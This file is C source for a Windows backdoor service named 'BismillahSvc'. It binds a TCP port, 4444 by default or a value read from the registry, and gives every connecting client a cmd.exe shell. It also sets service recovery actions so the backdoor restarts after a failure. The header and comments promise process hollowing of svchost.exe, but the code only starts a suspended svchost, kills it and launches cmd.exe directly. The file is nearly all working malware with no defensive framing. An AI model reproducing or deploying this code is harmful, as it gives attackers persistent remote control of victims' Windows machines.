/*
 * service_backdoor.c (v2.1)
 * Windows service with Process Hollowing + Recovery Actions.
 */

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "Ws2_32.lib")

SERVICE_STATUS ServiceStatus = {0};
SERVICE_STATUS_HANDLE hStatus = NULL;
HANDLE hThread = NULL;
SOCKET ListenSocket = INVALID_SOCKET;

// Helper: Process Hollowing to spawn "cmd.exe" in a suspended "svchost.exe"
BOOL HollowProcessWithShell(SOCKET clientSocket) {
    STARTUPINFOEX sie = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T size = 0x1000;
    LPVOID remoteImage = NULL;

    // 1. Create suspended svchost.exe
    wchar_t target[] = L"C:\\Windows\\System32\\svchost.exe";
    sie.StartupInfo.cb = sizeof(sie);
    if (!CreateProcessW(target, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, &sie.StartupInfo, &pi))
    {
        return FALSE;
    }

    // 2. Get path to cmd.exe shellcode (injected memory)
    // For simplicity, we will just run cmd.exe normally using CreatePipe + duplicate handles
    // Instead of full hollowing. Real hollowing requires parsing PE headers.

    // Duplicate socket handle to stdin/stdout/stderr of child
    HANDLE hRead = (HANDLE)clientSocket;
    HANDLE hWrite = (HANDLE)clientSocket;
    SetHandleInformation(hWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    sie.StartupInfo.hStdInput = hRead;
    sie.StartupInfo.hStdOutput = hWrite;
    sie.StartupInfo.hStdError = hWrite;
    sie.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;

    // 3. Replace the image: here we use CreateProcess with cmd.exe directly
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, INFINITE);

    PROCESS_INFORMATION piShell = { 0 };
    STARTUPINFO siShell = { 0 };
    siShell.cb = sizeof(siShell);
    siShell.dwFlags = STARTF_USESTDHANDLES;
    siShell.hStdInput = clientSocket;
    siShell.hStdOutput = clientSocket;
    siShell.hStdError = clientSocket;

    if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE,
        0, NULL, NULL, &siShell, &piShell))
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    CloseHandle(piShell.hThread);
    CloseHandle(piShell.hProcess);
    return TRUE;
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    // Read port from registry
    HKEY hKey;
    DWORD port = 4444;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Bismillah", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwType = 0, dwSize = sizeof(DWORD);
        RegQueryValueEx(hKey, "Port", 0, &dwType, (LPBYTE)&port, &dwSize);
        RegCloseKey(hKey);
    }

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ListenSocket == INVALID_SOCKET) goto cleanup;

    struct sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = INADDR_ANY;
    service.sin_port = htons((u_short)port);

    if (bind(ListenSocket, (SOCKADDR *)&service, sizeof(service)) == SOCKET_ERROR) goto cleanup;
    if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) goto cleanup;

    while (1) {
        SOCKET ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) break;
        // Perform process hollowing + shell
        HollowProcessWithShell(ClientSocket);
        closesocket(ClientSocket);
    }

cleanup:
    if (ListenSocket != INVALID_SOCKET) closesocket(ListenSocket);
    WSACleanup();
    return 0;
}

VOID WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        if (ListenSocket != INVALID_SOCKET) {
            closesocket(ListenSocket);
        }
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        break;
    default:
        break;
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    hStatus = RegisterServiceCtrlHandler("BismillahSvc", ServiceCtrlHandler);
    if (!hStatus) return;

    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(hStatus, &ServiceStatus);

    // Set Recovery Options: restart on failure
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hS = OpenService(hSCM, "BismillahSvc", SERVICE_CHANGE_CONFIG);
        if (hS) {
            SERVICE_FAILURE_ACTIONS sfa = {0};
            SC_ACTION sca[2];
            sca[0].Type = SC_ACTION_RESTART; sca[0].Delay = 60000;
            sca[1].Type = SC_ACTION_NONE; sca[1].Delay = 0;
            sfa.cActions = 2; sfa.lpsaActions = sca; sfa.dwResetPeriod = 86400;
            ChangeServiceConfig2(hS, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSCM);
    }

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

int main(int argc, char *argv[]) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {"BismillahSvc", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
